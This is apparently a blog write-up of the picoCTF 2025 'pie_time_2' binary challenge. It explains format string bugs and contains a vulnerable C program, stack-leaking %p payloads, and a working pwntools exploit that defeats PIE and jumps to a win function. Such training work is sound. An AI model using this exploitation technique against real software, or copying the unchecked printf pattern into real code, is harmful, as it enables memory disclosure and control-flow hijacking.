---
title: pie_time_2
description: Writeup for the pie_time_2 challenge in picoctf
created: 2025-07-02
tags: pwn, ctf, practice, picoctf
draft: false
---

# Introduction

---

**challenge description**:

Can you try to get the flag? I'm not revealing anything anymore!!

**challenge hints**:

What vulnerability can be exploited to leak the address?

Please be mindful of the size of pointers in this binary

**challenge summary**

The challenge pie_time_2 is a binary exploitation problem released as part of picoCTF 2025. It also focuses on address randomization, but with an added twist. Unlike [pie_time](pie_time.md), which provides the attacker with a leaked address, pie_time_2 requires the attacker to exploit a format string vulnerability to leak memory metadata. This leak can then be used to calculate the randomized addresses needed for successful exploitation.

# Enumeration

---

As with any engagement, we'll start by enumerating the target:

<style>
    .ascii-art {
        font-family: monospace;
        white-space: pre;
    }
</style>

```bash
$ file ./vuln
./vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=89c0ed5ed3766d1b85809c2bef48b6f5f0ef9364, for GNU/Linux 3.2.0, not stripped

$ pwn checksec ./vuln
[*] './vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

$ objdump -t ./vuln | grep -E ".text"
00000000000011c0 l    d  .text  0000000000000000              .text
00000000000011f0 l     F .text  0000000000000000              deregister_tm_clones
0000000000001220 l     F .text  0000000000000000              register_tm_clones
0000000000001260 l     F .text  0000000000000000              __do_global_dtors_aux
00000000000012a0 l     F .text  0000000000000000              frame_dummy
00000000000014c0 g     F .text  0000000000000005              __libc_csu_fini
00000000000012c7 g     F .text  00000000000000a3              call_functions
00000000000012a9 g     F .text  000000000000001e              segfault_handler
0000000000001450 g     F .text  0000000000000065              __libc_csu_init
000000000000136a g     F .text  0000000000000096              win
00000000000011c0 g     F .text  000000000000002f              _start
0000000000001400 g     F .text  0000000000000048              main
```

Like [pie_time](pie_time.md), this binary has PIE enabled. Additionally, from the `objdump` output, we can see there’s a `win` function. It’s likely that our goal will be to jump to `win`. To achieve this, we'll need to defeat PIE. Let’s take a look at the code.

# Code Review

---

<details>
    <summary>vuln.c</summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

</details>

Not much happens in `main` aside from setting up signal handlers, configuring buffers, and calling `call_functions`.

Inside `call_functions`, we’re first prompted to enter our name. The `name` character array is allocated 64 bytes of memory, and whatever we input is immediately printed back to stdout using a `printf` call. Next, we’re prompted for an address that the program will ultimately jump to.

Unlike [pie_time](pie_time.md), this challenge doesn’t provide us with a memory leak we can use to directly calculate the PIE base address. However, there’s a **format string vulnerability** on line 15. **What is a format string vulnerability?** To answer that, let’s take a step back and first ask: **What is a format string?**

---

## What is a Format String?

Put simply, a **format string** is a type of string in C/C++ used to produce formatted output. It contains a mix of regular text and format specifiers that tell the function how to display variables.

For example, consider the following code:

```c
printf("Hi! My name is %s and I'm %d years old!\n", name, age);
```

This code will print out:

> "Hi! My name is 8ugz and I'm 42 years old!"

But how does it do this? Let’s take a look at the [source code for `printf`](https://sourceware.org/git/?p=glibc.git;a=blob;f=stdio-common/printf.c;h=4c8f3a2a0c38ab27a2eed4d2ff3b804980aa8f9f;hb=3321010338384ecdc6633a8b032bb0ed6aa9b19a):

```c
int
__printf (const char *format, ...)
{
    va_list arg;
    int done;

    va_start (arg, format);
    done = vfprintf (stdout, format, arg);
    va_end (arg);

    return done;
}
```

The `printf` function is actually just a wrapper around [vfprintf](https://sourceware.org/git/?p=glibc.git;a=blob;f=stdio-common/vfprintf.c;h=fc370e8cbc4e9652a2ed377b1c6f2324f15b1bf9;hb=3321010338384ecdc6633a8b032bb0ed6aa9b19a), which does all the real formatting work.

In essence, `vfprintf` scans the format string from left to right. Each time it encounters a `%` (or `\x25`), it triggers a state machine that breaks down the format specifier. This specifier describes exactly how the corresponding variable should be printed.

The general structure of a format specifier is as follows:

> %[flags][width][.precision][length]specifier

You can read more about what each of these fields means—as well as other format specifiers [here](https://www.geeksforgeeks.org/c/printf-in-c/).

After the format specifier has been parsed, the values passed to `printf` are retrieved so they can be printed. These arguments are stored much like a stack:

<pre class="ascii-art">


                stack
        +-----------------------+
        |                       |   stack top       
        |         ...           |  
        |    return address     |       ^    
        | format string address |       |
        |         name          |       |
        |         age           |       |
        |         ...           |   
        |                       |   stack bottom
        +-----------------------+

</pre>

You may notice that in `__printf`, something called `va_list` is initialized. In C, any function that takes a _variable number_ of arguments is known as a **variadic function**. There’s a good explanation of the `va_*` family [here](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/va-arg-va-copy-va-end-va-start?view=msvc-170).

A `va_list` is simply the list of values passed to the variadic function. When using `va_arg`, a pointer to the current value is returned to the caller, and then the pointer is incremented to the next argument waiting to be read.

The last few steps involve converting the value read from memory into text, copying it into a buffer, and then invoking the system `write` call to output it.

Whew! That was a lot of theory. Now you should be asking the **so what...?** question. This brings us back to our original question...

## What is a Format String Vulnerability?

Let’s quickly summarize what `vfprintf` does:

1. The `printf` wrapper is called, which initializes a `va_list` and forwards everything to `vfprintf`.
2. The format string is parsed.
3. When a format specifier is encountered, a state machine interprets how the value should be formatted in the output.
4. The value is read from the stack using `va_arg`, formatted, and added to a buffer.
5. Finally, a `write` system call outputs the buffer.

Earlier, I mentioned **variadic functions**. Because variadic functions can take an arbitrary number of arguments, they have no way to know exactly how many arguments were passed. In C, variadic functions rely on the programmer to get this right.

Specifically, `printf` being a variadic function trusts that the programmer will supply the same number of arguments as there are format specifiers in the format string.

But what happens if this isn’t the case? Instead of:

```c
printf("Hi! My name is %s and I'm %d years old!\n", name, age)
```

We had:

```c
printf("Hi! My name is %s and I'm %d years old!\n", name);
```

This will result in our stack looking like:

<pre class="ascii-art">


                stack
        +-----------------------+
        |                       |   stack top       
        |         ...           |  
        |    return address     |       ^    
        | format string address |       |
        |         name          |       |
        |         ???           |       |
        |         ...           |   
        |                       |   stack bottom
        +-----------------------+

</pre>

After `vfprintf` processes the `%s` specifier and adds the `name` variable to the buffer, it continues until it encounters the `%d` specifier. Since `printf` relies on the programmer to supply the correct number of arguments, it assumes the stack is set up correctly.

As a result, it blindly reads a value from memory where `age` is supposed to be. This can lead to unintended data being printed causing a **memory leak**!

But what happens when a format string isn’t hard-coded in `printf`, and instead a user can supply it directly? What if the user can include format specifiers themselves? Let’s see:

```bash
$ ./vuln
Enter your name:%p
0xa70
```

We successfully read a value from the stack. Let’s try printing even more values:

```bash
$ ./vuln
Enter your name:%p.%p.%p.%p.%p
0x2e70252e70252e70.0xfbad2288.0x55d955ead2af.(nil).0x55d955ead2a0
```

As you can see, each `%p` specifier pulls another value from the stack and prints it, leaking memory contents we were never supposed to see.

We can see that we're able to read arbitrary memory from the stack. Instead of using a long chain of `%p` specifiers, we can directly specify the offset we want to read with something like `%42$p`, where `42` is any offset we choose.

For example:

```bash
$ ./vuln
Enter your name:%42$p
0x7fff00000000
```

This allows us to precisely target and leak values at specific stack positions.

# Exploitation

---

We now know that we can leak arbitrary memory from the stack using this format string vulnerability. This is perfect, because we'll first need to leak an address from memory to calculate the address of `win` and then jump to it.

But what can we leak from the stack that will be reliable every time?

Let’s take a closer look at the stack:

<pre class="ascii-art">



        +---------------------------+ 0x0000
        |                           |
        |                           | < rsp
        |                           |
        |                           |  
        |                           | < rbp - 0x18
        |                           | < rbp - 0x10
        |                           | < rbp - 0x8
        +---------------------------+ 
        |        saved rbp          | < rbp
        +---------------------------+ 
        |       return address      | < rbp + 0x8
        +---------------------------+ 
        |                           | < rbp + 0x10
        |                           | < rbp + 0x18
        |                           |
        |                           |
        |                           |
        |                           |
        |                           |
        +---------------------------+ 0xffff


</pre>

For those who may not know: when a new function is called in C, a new stack frame is created. The first two values typically pushed onto this frame are:

1. **The return address**: the address the CPU will jump to after the function finishes.
2. **Previous function’s RBP** (frame pointer): helps unwind the stack correctly.

This highlights a classic problem often exploited in C programs: **metadata about the program's control flow is stored in the same memory area as its variables and state**.

We can take advantage of this metadata, specifically, the return address on the stack. This return address is the location in `main` that execution will resume at once `call_functions` returns.

Let’s see what this address actually is:

```bash
...
0x000055ec666af437 <+55>:    mov    eax,0x0
0x000055ec666af43c <+60>:    call   0x55ec666af2c7 <call_functions>
0x000055ec666af441 <+65>:    mov    eax,0x0
...
```

The next address to return to will be `0x000055ec666af441`. Let’s set a breakpoint inside `call_functions` and inspect the stack:

```bash
(gdb) x/i $rip
=> 0x558944fcd2cf <call_functions+8>:   sub    rsp,0x60
(gdb) x/8gx $rsp
0x7ffffe8c5000: 0x00007ffffe8c5010      0x0000558944fcd441
0x7ffffe8c5010: 0x0000000000000001      0x00007f654eb67d90
0x7ffffe8c5020: 0x0000000000000000      0x0000558944fcd400
0x7ffffe8c5030: 0x0000000100000000      0x00007ffffe8c5128
```

We can see that at the very start of `call_functions` (before the rest of the stack frame is set up), the stack already contains the previous frame’s RBP and the return address. Perfect! Once we can leak that return address, we'll be able to calculate the base address of the binary and then compute the address of `win`.

First, let's figure out the offset in the format string leak that corresponds to the return address on the stack. To help with this, I wrote a script called `leak_stack.py` that leaks values from the stack along with their offsets:

<details>
    <summary>leak_stack.py</summary>

```python
#!/usr/bin/env python3

from pwn import *

SIZE = 32

for i in range(1, SIZE + 1):
    try:
        p = process("./vuln", level="error")

        payload = f"%{i}$p".encode("utf-8")
        p.sendlineafter(b"Enter your name:", payload)
        leak = p.recvline().decode("utf-8").strip()
        p.close()

        print(f"{i}: {leak}")
    except IOError as e:
        pass
```

</details>

Running this script gives us a bunch of output:

```bash
$ ./leak_stack.py
1: 0xa702431
2: 0xfbad2088
3: 0x555cf15202a5
4: (nil)
5: 0x559b81d9d2a0
6: (nil)
7: 0x7f9e58336780
8: 0xa70243825
9: (nil)
10: 0x7fa6f8594600
11: 0x7efeed2bf5ad
12: 0x7f739a5c6780
13: 0x7fd346a126e5
14: (nil)
15: 0x7ffe8bf3a120
16: 0x7ffc6b0fd688
17: 0x49fcfb9c5bda5000
18: 0x7fff041de0a0
19: 0x5569ab40c441
20: 0x1
21: 0x7fd23c1f4d90
22: (nil)
23: 0x55a33e378400
24: 0x100000000
25: 0x7ffe14db4f48
26: (nil)
27: 0xc8257181675c1ef5
28: 0x7ffc41fa2ea8
29: 0x55a40aabd400
30: (nil)
31: 0x7fed331ab040
32: 0xec6b6f0d9afcecf6
```

There’s an address that looks familiar, it ends with the recognizable 12 bits: `0x5569ab40c441`. (See [pie_time](pie_time.md) for why those last 12 bits are important.)

This address appears at offset 19. Let’s verify that:

```bash
$ ./vuln
Enter your name:%19$p
0x564a9fbe7441
```

Nice! With this memory leak, we can finally calculate the PIE base. The formula will be:

> pie_base = (leaked_return_address - offset_from_main) - main_absolute_offset

We know the absolute offset of `main` from `objdump`, which is `0x1400`:

```bash
$ objdump -t vuln | grep "main"
0000000000000000       F *UND*  0000000000000000              __libc_start_main@@GLIBC_2.2.5
0000000000001400 g     F .text  0000000000000048              main
```

The absolute offset of `win` is `0x136a`.

Lastly, we just need the leaked address’s offset from `main`:

```bash
(gdb) disass main
Dump of assembler code for function main:
   0x0000000000001400 <+0>:     endbr64
   0x0000000000001404 <+4>:     push   rbp
   0x0000000000001405 <+5>:     mov    rbp,rsp
   0x0000000000001408 <+8>:     lea    rsi,[rip+0xfffffffffffffe9a]        # 0x12a9 <segfault_handler>
   0x000000000000140f <+15>:    mov    edi,0xb
   0x0000000000001414 <+20>:    call   0x1170 <signal@plt>
   0x0000000000001419 <+25>:    mov    rax,QWORD PTR [rip+0x2bf0]        # 0x4010 <stdout@@GLIBC_2.2.5>
   0x0000000000001420 <+32>:    mov    ecx,0x0
   0x0000000000001425 <+37>:    mov    edx,0x2
   0x000000000000142a <+42>:    mov    esi,0x0
   0x000000000000142f <+47>:    mov    rdi,rax
   0x0000000000001432 <+50>:    call   0x1180 <setvbuf@plt>
   0x0000000000001437 <+55>:    mov    eax,0x0
   0x000000000000143c <+60>:    call   0x12c7 <call_functions>
   0x0000000000001441 <+65>:    mov    eax,0x0
   0x0000000000001446 <+70>:    pop    rbp
   0x0000000000001447 <+71>:    ret
(gdb) p/x 0x0000000000001441 - 0x0000000000001400
$1 = 0x41
```

The leaked address’s offset from `main` is `0x41`.

With this, we can now solve for the PIE base address using our formula.

<details>
    <summary>get_pie.py</summary>

```python
#!/usr/bin/env python3

from pwn import *

RET_ADDR_OFFSET = 0x41
MAIN_ABS_ADDR   = 0x1400
WIN_ABS_ADDR    = 0x136a

p = process("./vuln")

# ===== leak the return address
RET_PTR_OFFSET = 19
p.sendlineafter(b"Enter your name:", f"%{RET_PTR_OFFSET}$p".encode())
ret_ptr = p.recvline().decode()
info(f"ret_ptr: {ret_ptr}")

# ===== calculate base of main
main_addr = hex(int(ret_ptr, 16) - RET_ADDR_OFFSET)
info(f"main_addr: {main_addr}")

# ===== calculate pie base
pie_base = hex(int(main_addr, 16) - MAIN_ABS_ADDR)
success(f"pie_base: {pie_base}")

p.close()
```

</details>

```bash
$ ./get_pie.py
[+] Starting local process './vuln': pid 630
[*] ret_ptr: 0x55657b6ef441
[*] main_addr: 0x55657b6ef400
[+] pie_base: 0x55657b6ee000
[*] Stopped process './vuln' (pid 630)
```

Our exploit script will simply add `0x136a` (the offset of `win`) to `pie_base` and send that calculated address to the program giving us control to call `win` and get the flag!

<details>
    <summary>exploit.py</summary>

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 1337 vuln
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vuln', checksec=False)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

RET_ADDR_OFFSET   = 0x41
MAIN_ABS_OFFSET   = 0x1400
WIN_ABS_OFFSET    = 0x136a

# ===== leak the return address
RET_PTR_OFFSET = 19
io.sendlineafter(b"Enter your name:", f"%{RET_PTR_OFFSET}$p".encode())
ret_ptr = io.recvline().decode()
info(f"ret_ptr: {ret_ptr}")

# ===== calculate base of main
main_addr = hex(int(ret_ptr, 16) - RET_ADDR_OFFSET)
info(f"main_addr: {main_addr}")

# ===== calculate pie base
pie_base = hex(int(main_addr, 16) - MAIN_ABS_OFFSET)
success(f"pie_base: {pie_base}")

# ===== calculate base of win
win_addr = hex(int(pie_base, 16) + WIN_ABS_OFFSET)
success(f"win_addr: {win_addr}")
io.sendlineafter(b"enter the address to jump to, ex => 0x12345:", win_addr.encode())
io.recvline()

flag = io.recvline().rstrip().decode()
success(f"flag: {flag}")

io.close()
```

</details>

```bash
$ ./exploit.py
[+] Starting local process 'vuln': pid 819
[*] ret_ptr: 0x556ce99c3441
[*] main_addr: 0x556ce99c3400
[+] pie_base: 0x556ce99c2000
[+] win_addr: 0x556ce99c336a
[+] flag: flag{fake_flag}
```

# References

---

- [HackingLab - Format String Vulnerability](https://hackinglab.cz/en/blog/format-string-vulnerability/)
- [ir0nstone - Format String Bug](https://ir0nstone.gitbook.io/notes/binexp/stack/format-string)
- [ir0nstone - PIE](https://ir0nstone.gitbook.io/notes/binexp/stack/pie)
- [vickieli - Format String Vulnerabilities](https://vickieli.dev/binary%20exploitation/format-string-vulnerabilities/)
- [Code Arcana - Introduction to format string exploits](https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html)
- [axcheron.github.io - Exploit 101 - Format Strings](https://axcheron.github.io/exploit-101-format-strings/)
- [pwntools docs - Format string bug exploitation tools](https://docs.pwntools.com/en/stable/fmtstr.html)
- [guyinatuxedo.github.io - aslr/pie intro](https://guyinatuxedo.github.io/5.1-mitigation_aslr_pie/index.html)
